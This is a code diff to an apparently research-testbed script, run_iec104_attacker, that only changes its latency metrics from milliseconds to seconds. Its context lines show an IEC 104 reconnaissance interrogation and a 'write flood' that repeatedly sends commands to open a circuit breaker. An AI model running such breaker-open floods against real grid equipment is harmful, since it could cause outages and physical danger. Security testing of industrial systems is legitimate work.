@@ -65,14 +65,14 @@ def run_iec104_attacker():
 				cause=c104.Cot.ACTIVATION,
 				qualifier=c104.Qoi.STATION,
 			)
-			recon_latency_ms = (time.time() - recon_start) * 1000.0
+			recon_latency = (time.time() - recon_start)
 			if gi_ok:
-				print(f" [+] Recon completed in {recon_latency_ms:.2f} ms")
-				push_metric("attack_recon", "recon_latency_ms", recon_latency_ms)
+				print(f" [+] Recon completed in {recon_latency:.2f}s")
+				push_metric("attack_recon", "recon_latency", recon_latency)
 				push_metric("attack_recon", "gi_ok", 1)
 			else:
-				print(f" [!] Recon failed in {recon_latency_ms:.2f} ms")
-				push_metric("attack_recon", "recon_latency_ms", recon_latency_ms)
+				print(f" [!] Recon failed in {recon_latency:.2f}s")
+				push_metric("attack_recon", "recon_latency", recon_latency)
 				push_metric("attack_recon", "gi_ok", 0)
 		except Exception as e:
 			print(f" Recon exception: {e}")
@@ -88,9 +88,9 @@ def run_iec104_attacker():
 				start_time = time.time()
 				breaker_cmd.value = False  # OPEN breaker
 				ok = breaker_cmd.transmit(cause=c104.Cot.ACTIVATION)
-				latency_ms = (time.time() - start_time) * 1000.0
+				latency = (time.time() - start_time)
 
-				push_metric("attack_write_flood", "latency_ms", latency_ms)
+				push_metric("attack_write_flood", "latency", latency)
 				push_metric("attack_write_flood", "open_cmd_value", 0)
 
 				if ok:
